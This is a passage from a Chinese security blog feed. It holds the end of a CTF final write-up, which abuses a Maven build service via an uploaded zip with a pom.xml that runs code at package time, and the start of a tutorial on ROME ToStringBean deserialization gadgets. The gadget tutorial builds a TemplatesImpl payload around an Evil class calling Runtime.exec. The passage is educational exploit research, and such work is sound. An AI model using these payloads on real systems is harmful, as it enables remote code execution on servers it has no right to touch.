&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>net.lingala.zip4j 这个包似乎无法zip slip</p><p>报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net.lingala.zip4j.exception.ZipException: illegal file name that breaks out of the target directory: ../a.txt<br></code></pre></td></tr></table></figure><p>maven.config可以加载配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ca29ecffef7e:/tmp/test# <span class="hljs-built_in">ls</span> -al<br>total 20<br>drwxr-xr-x 3 root root 4096 Aug  4 03:49 .<br>drwxrwxrwt 1 root root 4096 Aug  4 04:09 ..<br>drwxr-xr-x 2 root root 4096 Aug  4 04:09 .mvn<br>-rw-r--r-- 1 root root  859 Aug  4 03:47 pom.xml<br>root@ca29ecffef7e:/tmp/test# <span class="hljs-built_in">ls</span> -al .mvn/<br>total 12<br>drwxr-xr-x 2 root root 4096 Aug  4 04:09 .<br>drwxr-xr-x 3 root root 4096 Aug  4 03:49 ..<br>-rw-r--r-- 1 root root  165 Aug  4 03:45 maven.config<br></code></pre></td></tr></table></figure><p>这个大小限制了，maybe是要自己写一个maven插件过去？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">spring.servlet.multipart.max-file-size=128KB<br>spring.servlet.multipart.max-request-size=256KB<br></code></pre></td></tr></table></figure><p>远程环境有 spring-boot-maven-plugin 这个插件，利用这个插件可以在mvn package时运行当前项目。</p><p>后续可以通过将命令执行结果写入target目录来实现回显。</p><p>poc3.zip：</p><p><img src="/2024/08/11/jqctf-final/image-20240811224655411.png" alt="image-20240811224655411"></p><p>pom.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>demo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>jar<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>demo<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Demo project for Spring Boot<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>17<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- Add other dependencies as needed --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- Spring Boot Plugin --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-comment">&lt;!-- &lt;version&gt;3.3.1&lt;/version&gt; --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span><br>                        <span class="hljs-comment">&lt;!-- 指定运行的目标 --&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>run<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span><br>                    <span class="hljs-comment">&lt;!-- 配置该插件执行的生命周期阶段 --&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">phase</span>&gt;</span>package<span class="hljs-tag">&lt;/<span class="hljs-name">phase</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p>MavenPackerApplication.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MavenPackerApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">// Example command to execute</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/readflag&quot;</span>;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">outputFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;./target/flag.txt&quot;</span>);<br><br>        <span class="hljs-comment">// Execute the command</span><br>        executeCommand(command, outputFile);<br><br>        SpringApplication.run(MavenPackerApplication.class, args);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(String command, File outputFile)</span> &#123;<br>        <span class="hljs-comment">// Create a ProcessBuilder with the command</span><br>        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(command.split(<span class="hljs-string">&quot; &quot;</span>));<br>        <br>        <span class="hljs-comment">// Redirect output to the specified file</span><br>        processBuilder.redirectOutput(outputFile);<br>        processBuilder.redirectErrorStream(<span class="hljs-literal">true</span>);<br>        <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// Start the process</span><br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> processBuilder.start();<br>            <br>            <span class="hljs-comment">// Wait for the process to complete</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">exitCode</span> <span class="hljs-operator">=</span> process.waitFor();<br>            System.out.println(<span class="hljs-string">&quot;Process exited with code: &quot;</span> + exitCode);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException | InterruptedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>settings.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/SETTINGS/1.0.0&quot;</span></span><br><span class="hljs-tag">          <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">          <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">localRepository</span>&gt;</span>/home/app/.m2/repository<span class="hljs-tag">&lt;/<span class="hljs-name">localRepository</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>f = &#123;<span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;poc3.zip&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)&#125;<br><br>p = &#123;<span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>&#125;<br><br><br>res = requests.post(<span class="hljs-string">&quot;http://30.222.0.20:45807/pack&quot;</span>, files=f, proxies=p)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.zip&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(res.content)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Rome</title>
    <link href="/2024/08/10/Rome/"/>
    <url>/2024/08/10/Rome/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ROME is a Java framework for RSS and Atom feeds</p><p>RSS ： Really Simple Syndication（真正简易联合）</p><p>是一种消息来源格式规范，用以聚合经常发布更新数据的网站，例如博客文章、新闻、音频或视频的网摘。其使用XML编写</p><p>RSS 阅读器用于读取 RSS feed。ROME就是一个RSS 阅读器的实现。</p><p>Rome 提供了 <strong>ToStringBean</strong> 这个类，提供深入的 toString 方法对JavaBean进行操作，这也是问我们用Rome打反序列化的<strong>核心利用点</strong>。</p><h2 id="浅析"><a href="#浅析" class="headerlink" title="浅析"></a>浅析</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>rome<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>rome<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ToStringBean</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123; <span class="hljs-comment">// 实现了Serializable接口</span><br><span class="hljs-keyword">protected</span> <span class="hljs-title function_">ToStringBean</span><span class="hljs-params">(Class beanClass)</span> &#123;<br>        _beanClass = beanClass;<br>        _obj = <span class="hljs-built_in">this</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Stack</span> <span class="hljs-variable">stack</span> <span class="hljs-operator">=</span> (Stack) PREFIX_TL.get();<br>        String[] tsInfo = (String[]) ((stack.isEmpty()) ? <span class="hljs-literal">null</span> : stack.peek());<br>        String prefix;<br>        <span class="hljs-keyword">if</span> (tsInfo==<span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> _obj.getClass().getName();<br>            prefix = className.substring(className.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            prefix = tsInfo[<span class="hljs-number">0</span>];<br>            tsInfo[<span class="hljs-number">1</span>] = prefix;<br>        &#125;<br>        <span class="hljs-keyword">return</span> toString(prefix);<br>    &#125;<br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">(String prefix)</span> &#123;<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(<span class="hljs-number">128</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(_beanClass);<br>            <span class="hljs-keyword">if</span> (pds!=<span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;pds.length;i++) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">pName</span> <span class="hljs-operator">=</span> pds[i].getName();<br>                    <span class="hljs-type">Method</span> <span class="hljs-variable">pReadMethod</span> <span class="hljs-operator">=</span> pds[i].getReadMethod();<br>                    <span class="hljs-keyword">if</span> (pReadMethod!=<span class="hljs-literal">null</span> &amp;&amp;                             <span class="hljs-comment">// ensure it has a getter method</span><br>                        pReadMethod.getDeclaringClass()!=Object.class &amp;&amp; <span class="hljs-comment">// filter Object.class getter methods</span><br>                        pReadMethod.getParameterTypes().length==<span class="hljs-number">0</span>) &#123;     <span class="hljs-comment">// filter getter methods that take parameters</span><br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> pReadMethod.invoke(_obj,NO_PARAMS);<br>                        printProperty(sb,prefix+<span class="hljs-string">&quot;.&quot;</span>+pName,value);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>            sb.append(<span class="hljs-string">&quot;\n\nEXCEPTION: Could not complete &quot;</span>+_obj.getClass()+<span class="hljs-string">&quot;.toString(): &quot;</span>+ex.getMessage()+<span class="hljs-string">&quot;\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>toString(String prefix)</code>有可疑的<code>pReadMethod.invoke</code></p><p><code>BeanIntrospector.getPropertyDescriptors(_beanClass);</code>能够获取类中的属性名及其getter方法（getter需要public）</p><p>可以本地试试：</p><p>新建一个<code>Person</code>类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(Person.class);<br><span class="hljs-keyword">if</span> (pds != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; pds.length; i++) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">pName</span> <span class="hljs-operator">=</span> pds[i].getName();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">pReadMethod</span> <span class="hljs-operator">=</span> pds[i].getReadMethod();<br>        System.out.println(pReadMethod.getName());<br>    &#125;<br>&#125;<br><span class="hljs-comment">//        getName </span><br><span class="hljs-comment">//        getClass</span><br><span class="hljs-comment">//        getAge</span><br></code></pre></td></tr></table></figure><p>接着遍历<code>PropertyDescriptor</code>数组，对于每个getter方法，若其不是Class类的getter方法（一般就是<code>getClass</code>了），且无参，则执行该方法（<code>pReadMethod.invoke(_obj,NO_PARAMS)</code>）</p><p>在<code>FastJson</code>那节我们就接触了几个可以利用<code>getter</code>方法的恶意类</p><ul><li><code>TemplatesImpl#getOutputProperties</code>（fastjson中需要开启<code>Feature.SupportNonPublicField</code>）</li><li><code>JdbcRowSetImpl#getDatabaseMetaData()</code>（jndi注入，需要出网）</li><li><code>BasicDataSource#getConnection</code>（BCEL码）</li></ul><p>下面以<code>TemplatesImpl#getOutputProperties</code>为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span><br>            <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>    field.setAccessible(<span class="hljs-literal">true</span>);<br>    field.set(obj, newValue);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(TemplatesImpl.class, obj);<br>    System.out.println(bean);  <span class="hljs-comment">// 